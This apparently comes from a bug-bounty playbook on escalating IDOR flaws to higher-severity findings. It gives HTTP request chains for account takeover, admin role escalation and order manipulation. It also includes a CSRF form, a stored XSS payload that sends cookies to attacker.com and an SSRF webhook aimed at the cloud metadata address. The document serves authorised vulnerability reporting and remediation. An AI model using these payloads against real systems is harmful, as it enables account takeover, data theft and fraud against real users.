---
tags:
  - high
  - logic
---

# IDOR Escalation

You have IDOR. Now maximize the impact for your report.

---

## Impact Hierarchy

From lowest to highest severity:

1. **Read non-sensitive data** → Low
2. **Read PII (email, phone)** → Medium
3. **Read sensitive data (SSN, financial)** → High
4. **Modify other users' data** → High
5. **Delete other users' data** → High
6. **Account takeover** → Critical
7. **Admin access** → Critical
8. **Financial manipulation** → Critical

Your goal: climb this ladder.

---

## Escalation Chains

### IDOR → Account Takeover

**Email Change + Password Reset:**
```http
# Step 1: Change victim's email
PUT /api/users/VICTIM_ID
Authorization: Bearer attacker_token
{"email": "attacker@evil.com"}

# Step 2: Trigger password reset
POST /api/password-reset
{"email": "attacker@evil.com"}

# Step 3: Reset goes to your email
# Full ATO achieved
```

**Direct Password Change:**
```http
PUT /api/users/VICTIM_ID/password
Authorization: Bearer attacker_token
{"new_password": "pwned123"}
```

**Disable 2FA:**
```http
PUT /api/users/VICTIM_ID/security
Authorization: Bearer attacker_token
{"two_factor": false}
```

### IDOR → Admin Access

**Role Manipulation:**
```http
PUT /api/users/YOUR_ID
Authorization: Bearer your_token
{"role": "admin"}

# Or via admin endpoint
POST /api/admin/promote
{"user_id": YOUR_ID, "role": "admin"}
```

**Admin Function Access:**
```http
# Access admin endpoints with admin user's ID
GET /api/admin/users
X-Admin-Id: ADMIN_USER_ID
```

### Read → Write Escalation

Found read-only IDOR? Try:

```http
# If GET works...
GET /api/users/VICTIM_ID → 200

# Try PUT/PATCH/DELETE
PUT /api/users/VICTIM_ID
{"email": "test@test.com"}

DELETE /api/users/VICTIM_ID
```

### Single → Mass Exploitation

**Demonstrate scale without mass-exploiting:**

```bash
# Count total users (if endpoint allows)
GET /api/users?limit=1
# Response: {"total": 2500000, "data": [...]}

# Or enumerate range
for id in 1 10 100 1000 10000; do
  curl -s "https://target.com/api/users/$id" | jq -r '.id' 
done
# If all return data, extrapolate to full database
```

---

## Chaining with Other Vulns

### IDOR + CSRF

If IDOR requires POST and there's no CSRF protection:

```html
<form id="f" action="https://target.com/api/users/VICTIM_ID" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('f').submit();</script>
```

### IDOR + XSS

Store XSS payload via IDOR:

```http
PUT /api/users/VICTIM_ID/profile
{"bio": "<script>document.location='https://attacker.com/?c='+document.cookie</script>"}
```

When victim views their own profile, XSS fires.

### IDOR + SSRF

If IDOR allows setting webhook URLs:

```http
PUT /api/users/VICTIM_ID/settings
{"webhook_url": "http://169.254.169.254/latest/meta-data/"}
```

---

## Financial Impact

### Order Manipulation

```http
# Access other users' orders
GET /api/orders/VICTIM_ORDER_ID

# Modify order contents
PUT /api/orders/VICTIM_ORDER_ID
{"items": [...], "price": 0.01}

# Cancel/refund orders
POST /api/orders/VICTIM_ORDER_ID/refund
```

### Payment Method Access

```http
GET /api/users/VICTIM_ID/payment-methods
# Returns card numbers, bank accounts, etc.
```

### Transaction History

```http
GET /api/users/VICTIM_ID/transactions
# Full financial history exposure
```

---

## Data Sensitivity

### Sensitive Data Types

| Data Type | Impact |
|-----------|--------|
| Email, phone | Medium |
| Full name, address | Medium-High |
| SSN, government ID | Critical |
| Credit card numbers | Critical |
| Bank account details | Critical |
| Medical records | Critical |
| Authentication tokens | Critical |
| Private messages | High |

### PII Aggregation

Even "low-severity" data becomes critical when combined:

```
Email + Phone + Address + DOB = Identity theft
```

Document the full data exposed, not just "user profile."

---

## Real-World Examples

### McHire/Paradox (64M records)

```http
PUT /api/lead/cem-xhr
{"lead_id": 64185741}  # Sequential, no auth check
# Leaked: name, email, phone, address, JWT tokens
```

Impact: Full PII + JWT tokens for 64 million users.

### CrowdSignal IDOR → ATO

```http
GET /users/invite-user.php?id=19920465
# Change ID → See/edit any user → Update Permissions → ATO
```

Impact: Complete account takeover of any user.

### DoD Medical Records

```http
GET /viewMedicalRecord?recordId=VICTIM_ID
→ 302 Redirect (but PDF data in response body!)
```

Impact: Medical records exposed despite "redirect" response.

---

## Impact Documentation

### Calculate Scale

```markdown
## Affected Users
- Total users in database: ~2,500,000
- Tested IDs 1-100: 98 returned valid data
- Extrapolated exposure: ~2,450,000 users
```

### Categorize Data Exposure

```markdown
## Data Exposed Per User
- Email address
- Phone number  
- Full name
- Physical address
- Date of birth
- Profile photo
- Account creation date
- Last login timestamp
```

### Risk Assessment

```markdown
## Risk Analysis
- **Confidentiality**: Critical - PII of all users exposed
- **Integrity**: High - Attacker can modify user data
- **Availability**: Medium - Attacker can delete resources
- **Compliance**: GDPR, CCPA, HIPAA violations
```

---

## Impact Statements

| Scenario | Impact Statement |
|----------|------------------|
| Read PII | "Attacker can access personal data (email, phone, address) of all 2.5M users in the database" |
| ATO via email change | "Attacker can take over any user account by changing email and resetting password" |
| Admin access | "Attacker can escalate to admin role, gaining full control of the platform" |
| Financial | "Attacker can access payment methods and transaction history of all users" |
| Mass deletion | "Attacker can delete resources for any user, causing permanent data loss" |

---

## PoC Template

```markdown
## Summary
IDOR in [endpoint] allows [action] on any user's [resource].

## Severity
Critical / High / Medium

## Steps to Reproduce
1. Create two accounts (attacker: user_id=123, victim: user_id=124)
2. Login as attacker
3. Navigate to [endpoint] and capture request
4. Change [parameter] from 123 to 124
5. Observe: victim's data is [returned/modified/deleted]

## Affected Data
- User email
- User phone
- [Other sensitive fields]

## Impact
- Affects all [NUMBER] users in database
- Attacker can [read/modify/delete] any user's [resource]
- [Specific business impact]

## Proof of Concept
[Screenshot showing different user's data]
[Redact actual PII]

## Remediation
Implement proper authorization checks on [endpoint]:
- Verify requesting user owns the resource
- Use session-based user identification, not client-supplied IDs
```

---

## Checklist Before Reporting

- [ ] Confirmed IDOR with two accounts
- [ ] Documented read/write/delete capabilities
- [ ] Estimated scale (total affected users)
- [ ] Listed all exposed data fields
- [ ] Checked for ATO escalation paths
- [ ] Tested admin function access
- [ ] Screenshots with PII redacted
- [ ] Clear reproduction steps
- [ ] Impact statement based on actual exposure
